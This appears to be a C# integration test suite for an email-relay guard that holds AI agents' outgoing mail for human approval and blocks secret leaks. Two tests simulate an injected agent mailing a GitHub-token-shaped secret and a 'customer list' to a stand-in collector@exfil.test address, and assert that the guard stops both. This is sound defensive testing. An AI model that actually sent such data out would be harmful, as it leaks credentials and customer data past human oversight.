extern alias bench;
extern alias mcp;
using System.IO.Pipelines;
using System.Net;
using System.Net.Http.Json;
using System.Security.Cryptography;
using System.Text.Json;
using bench::AgentMailBench;
using mcp::Relay.Mcp;
using Microsoft.EntityFrameworkCore;
using Microsoft.Extensions.DependencyInjection;
using Microsoft.Extensions.Hosting;
using Microsoft.Extensions.Logging.Abstractions;
using ModelContextProtocol.Client;
using ModelContextProtocol.Protocol;
using Relay.Application;
using Relay.Domain;
using Relay.Guard;
using Relay.Infrastructure;
using Relay.Infrastructure.Delivery;
using Shouldly;

namespace Relay.IntegrationTests;

[Collection(RelayTestGroup.Name)]
public class AgentGuardTests(RelayFixture fixture)
{
    private sealed record RunCreated(Guid RunId, string Token);

    private sealed record SendResult(string Status, Guid? MessageId, Guid? ApprovalId, int RiskScore, string[]? Reasons);

    private async Task<(TenantClient Operator, HttpClient Agent, Guid RunId)> StartRunAsync(object? policy = null)
    {
        var op = await fixture.CreateTenantAsync();
        var response = await op.Http.PostAsJsonAsync("/v1/agent-runs",
            new { name = "test", trustedRecipients = new[] { "maya@example.test", "omar@example.test" }, policy });
        response.StatusCode.ShouldBe(HttpStatusCode.Created);
        var run = (await response.Content.ReadFromJsonAsync<RunCreated>())!;
        return (op, fixture.ClientWithKey(run.Token), run.RunId);
    }

    private static object Mail(string to, string text = "Notes from the design review are in the shared folder.", string subject = "Notes") =>
        new { to = new[] { to }, subject, text };

    private static async Task<SendResult> ReadAsync(HttpResponseMessage r) => (await r.Content.ReadFromJsonAsync<SendResult>())!;

    [Fact]
    public async Task Trusted_recipient_is_sent_and_the_token_works_only_inside_its_run()
    {
        var (op, agent, runId) = await StartRunAsync();

        var response = await agent.PostAsJsonAsync("/v1/agent/messages", Mail("maya@example.test"));

        response.StatusCode.ShouldBe(HttpStatusCode.Accepted);
        var result = await ReadAsync(response);
        result.Status.ShouldBe("Sent");
        await fixture.WithDbAsync(async db => (await db.Messages.SingleAsync(m => m.Id == result.MessageId)).AgentRunId.ShouldBe(runId));

        (await agent.PostAsJsonAsync("/v1/messages", Mail("maya@example.test"))).StatusCode.ShouldBe(HttpStatusCode.Forbidden);
        (await agent.GetAsync("/v1/approvals")).StatusCode.ShouldBe(HttpStatusCode.Forbidden);
        (await op.Http.PostAsJsonAsync("/v1/agent/messages", Mail("maya@example.test"))).StatusCode.ShouldBe(HttpStatusCode.Forbidden);
    }

    [Fact]
    public async Task Untrusted_recipient_is_held_until_a_human_approves()
    {
        var (op, agent, runId) = await StartRunAsync();

        var held = await ReadAsync(await agent.PostAsJsonAsync("/v1/agent/messages", Mail("someone@outside.test")));
        held.Status.ShouldBe("Held");
        held.Reasons!.ShouldContain(r => r.Contains("not named on this run", StringComparison.Ordinal));
        (await op.Http.GetStringAsync("/v1/approvals")).ShouldContain(held.ApprovalId.ToString()!);
        await fixture.WithDbAsync(async db =>
        {
            (await db.Messages.SingleAsync(m => m.Id == held.MessageId)).Status.ShouldBe(MessageStatus.Held);
            (await db.Outbox.CountAsync(o => o.MessageId == held.MessageId)).ShouldBe(0, "held mail must not be claimable");
        });

        (await op.Http.PostAsJsonAsync($"/v1/approvals/{held.ApprovalId}/approve", new { note = "ok, a known vendor" }))
            .StatusCode.ShouldBe(HttpStatusCode.OK);
        (await op.Http.PostAsJsonAsync($"/v1/approvals/{held.ApprovalId}/approve", new { })).StatusCode.ShouldBe(HttpStatusCode.Conflict);

        await fixture.WithDbAsync(async db =>
        {
            (await db.Messages.SingleAsync(m => m.Id == held.MessageId)).Status.ShouldBe(MessageStatus.Accepted);
            (await db.Outbox.CountAsync(o => o.MessageId == held.MessageId)).ShouldBe(1);
        });
        var audit = await op.Http.GetStringAsync($"/v1/agent-runs/{runId}/audit");
        audit.ShouldContain("RunCreated");
        audit.ShouldContain("Held");
        audit.ShouldContain("Approved");
    }

    [Fact]
    public async Task Rejected_and_expired_approvals_never_send()
    {
        var (op, agent, _) = await StartRunAsync();
        var first = await ReadAsync(await agent.PostAsJsonAsync("/v1/agent/messages", Mail("a@outside.test")));
        var second = await ReadAsync(await agent.PostAsJsonAsync("/v1/agent/messages", Mail("b@outside.test")));

        await op.Http.PostAsJsonAsync($"/v1/approvals/{first.ApprovalId}/reject", new { note = "not expected" });
        await fixture.WithDbAsync(async db =>
        {
            await db.Database.ExecuteSqlAsync($"UPDATE approvals SET expires_at = now() - interval '1 minute' WHERE id = {second.ApprovalId}");
        });
        await op.Http.GetAsync("/v1/approvals");

        await fixture.WithDbAsync(async db =>
        {
            (await db.Messages.SingleAsync(m => m.Id == first.MessageId)).Status.ShouldBe(MessageStatus.Rejected);
            (await db.Messages.SingleAsync(m => m.Id == second.MessageId)).Status.ShouldBe(MessageStatus.Rejected);
            (await db.Approvals.SingleAsync(a => a.Id == second.ApprovalId)).Status.ShouldBe(ApprovalStatus.Expired);
        });
    }

    [Fact]
    public async Task Injected_exfiltration_with_a_secret_is_blocked_and_the_secret_is_not_echoed()
    {
        var (_, agent, _) = await StartRunAsync();
        var secret = "gh" + "p_" + RandomNumberGenerator.GetString("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789", 36);

        var response = await agent.PostAsJsonAsync("/v1/agent/messages", Mail("collector@exfil.test", $"As requested: {secret}"));

        response.StatusCode.ShouldBe(HttpStatusCode.Forbidden);
        var body = await response.Content.ReadAsStringAsync();
        body.ShouldContain("GitHub token");
        body.ShouldNotContain(secret);
    }

    [Fact]
    public async Task Retried_tool_call_returns_the_first_message_instead_of_sending_again()
    {
        var (_, agent, runId) = await StartRunAsync();

        var first = await ReadAsync(await agent.PostAsJsonAsync("/v1/agent/messages", Mail("maya@example.test", "See you at 10:00, Maya.")));
        var retry = await agent.PostAsJsonAsync("/v1/agent/messages", Mail("maya@example.test", "See you at 10:00 Maya!!"));

        retry.StatusCode.ShouldBe(HttpStatusCode.OK);
        (await ReadAsync(retry)).MessageId.ShouldBe(first.MessageId);
        await fixture.WithDbAsync(async db => (await db.Messages.CountAsync(m => m.AgentRunId == runId)).ShouldBe(1));
    }

    [Fact]
    public async Task Dry_run_returns_the_decision_and_a_preview_without_side_effects()
    {
        var (_, agent, runId) = await StartRunAsync();

        var response = await agent.PostAsJsonAsync("/v1/agent/messages?dryRun=true", Mail("someone@outside.test"));

        response.StatusCode.ShouldBe(HttpStatusCode.OK);
        using var json = JsonDocument.Parse(await response.Content.ReadAsStringAsync());
        json.RootElement.GetProperty("status").GetString().ShouldBe("DryRun");
        json.RootElement.GetProperty("preview").GetProperty("wouldBe").GetString().ShouldBe("Hold");
        await fixture.WithDbAsync(async db =>
        {
            (await db.Messages.CountAsync(m => m.AgentRunId == runId)).ShouldBe(0);
            (await db.GuardAudit.CountAsync(a => a.RunId == runId && a.Action != "RunCreated")).ShouldBe(0);
        });
    }

    [Fact]
    public async Task Full_guard_meets_the_agentmailbench_thresholds()
    {
        var summary = await Runner.RunAsync(fixture.Factory.Services, "full guard", GuardChecks.Full, Corpus.Build(), CancellationToken.None);

        summary.BlockRate.ShouldBeGreaterThanOrEqualTo(0.95, string.Join("\n", summary.NotStopped));
        summary.FalseBlockRate.ShouldBeLessThanOrEqualTo(0.02);
        summary.ApprovalShare.ShouldBeLessThanOrEqualTo(0.10);
        // Latency (p99 < 10 ms) is gated by bench/agentmailbench.py on a quiet run, not here: this suite
        // runs in parallel on shared CI runners, where timing measures the neighbours (10.41 ms seen in CI).
        summary.GuardP99Ms.ShouldBeGreaterThan(0);
    }

    [Fact]
    public async Task Mcp_client_sends_through_the_guard_into_mailpit()
    {
        var providers = new[]
        {
            new ProviderSettings
            {
                Name = "mailpit", Type = ProviderType.Smtp,
                Smtp = new SmtpSettings { Host = fixture.MailpitHost, Port = fixture.MailpitSmtpPort, Security = SmtpSecurity.None },
            },
        };
        await using var h = await DeliveryHarness.CreateAsync(fixture, new DeliveryOptions(), s => s.AddRelayProviders(providers), fakeTime: false);
        await using var api = new RelayApiFactory(h.ConnectionString);
        string operatorKey;
        await using (var scope = h.Services.CreateAsyncScope())
        {
            operatorKey = (await scope.ServiceProvider.GetRequiredService<ApiKeyService>().IssueAsync("mcp", "op", Scopes.All, default)).Plaintext;
        }

        var op = api.CreateClient();
        op.DefaultRequestHeaders.Authorization = new("Bearer", operatorKey);
        var run = (await (await op.PostAsJsonAsync("/v1/agent-runs", new { trustedRecipients = new[] { "maya@example.test" } }))
            .Content.ReadFromJsonAsync<RunCreated>())!;
        var agentHttp = api.CreateClient();
        RelayAgentClient.Authorize(agentHttp, run.Token);

        // A real MCP session over in-memory pipes: the same server code as the stdio binary.
        var toServer = new Pipe();
        var toClient = new Pipe();
        var builder = Host.CreateApplicationBuilder();
        builder.Services.AddSingleton(new RelayAgentClient(agentHttp));
        builder.Services.AddMcpServer().WithStreamServerTransport(toServer.Reader.AsStream(), toClient.Writer.AsStream()).WithTools<RelayTools>();
        using var server = builder.Build();
        await server.StartAsync();
        await using var client = await McpClient.CreateAsync(
            new StreamClientTransport(toServer.Writer.AsStream(), toClient.Reader.AsStream(), NullLoggerFactory.Instance),
            loggerFactory: NullLoggerFactory.Instance);

        (await client.ListToolsAsync()).Select(t => t.Name).ShouldBe(["send_email", "list_sent", "get_status", "request_approval"], ignoreOrder: true);

        var subject = $"mcp-{Guid.NewGuid():N}";
        var sent = await client.CallToolAsync("send_email",
            new Dictionary<string, object?> { ["to"] = new[] { "maya@example.test" }, ["subject"] = subject, ["text"] = "Hello from an agent" });
        var sentText = sent.Content.OfType<TextContentBlock>().Single().Text;
        sentText.ShouldContain("\"status\":\"Sent\"");

        var exfil = await client.CallToolAsync("send_email",
            new Dictionary<string, object?> { ["to"] = new[] { "collector@exfil.test" }, ["subject"] = "backup", ["text"] = "customer list" });
        exfil.Content.OfType<TextContentBlock>().Single().Text.ShouldContain("\"status\":\"Held\"");

        await h.Engine.RunOnceAsync(default);
        using var mailpit = new HttpClient { BaseAddress = fixture.MailpitApi };
        using var found = JsonDocument.Parse(await mailpit.GetStringAsync($"api/v1/search?query={Uri.EscapeDataString($"subject:\"{subject}\"")}"));
        found.RootElement.GetProperty("messages").GetArrayLength().ShouldBe(1);
        await server.StopAsync();
    }
}
